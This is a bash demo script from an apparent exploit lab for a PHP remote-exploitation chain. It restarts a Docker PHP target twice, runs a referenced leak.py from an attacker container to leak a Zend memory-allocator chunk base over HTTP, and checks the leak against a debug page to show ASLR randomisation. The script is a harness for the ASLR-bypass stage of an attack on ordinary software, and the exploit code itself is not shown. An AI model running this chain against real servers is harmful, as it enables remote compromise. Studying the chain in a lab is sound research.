#!/usr/bin/env bash
#
# demo_aslr.sh — php2leak remote ASLR leak (PHP2Shell CVE-2026-109618/109619
# chain, ASLR-leak stage), twice with a restart between runs to show the leaked
# Zend MM chunk base is randomized. Each run also fetches the debug.php
# ground-truth page so you can compare the leaked chunk base against the
# worker's real [anon:zend_alloc] mappings and libphp.so base.
#
# Fully remote over HTTP: arm -> leak (SID constant reflected in the response
# body).  No memory patching, no send_cookie flag, no php.ini overrides.

set -eo pipefail

STRIP_ANSI=$'s/\033\\[[0-9;]*m//g'

wait_ready() {
  for _ in $(seq 1 30); do
    if docker exec php2leak-target \
        curl -s -f -o /dev/null http://localhost/debug.php 2>/dev/null; then
      return 0
    fi
    sleep 0.5
  done
  echo "Error: timed out waiting for php2leak-target" >&2
  return 1
}

run() {
  docker restart php2leak-target >/dev/null 2>&1
  wait_ready

  echo "  [leak]"
  docker compose run --rm -T -e TERM=dumb -e PWNLIB_NOTERM=1 attacker \
    python3 /exploit/leak.py target 80 2>&1 \
    | sed "$STRIP_ANSI" | grep -E "heap ptr|chunk base" | sed 's/^/    /'

  echo "  [ground truth] debug.php"
  docker exec php2leak-target curl -s http://localhost/debug.php \
    | grep -E "zend_alloc|libphp" | awk '{print "    " $1 "  " $NF}'
}

echo "== run 1 =="; run
echo "== run 2 (restart -> ASLR) =="; run
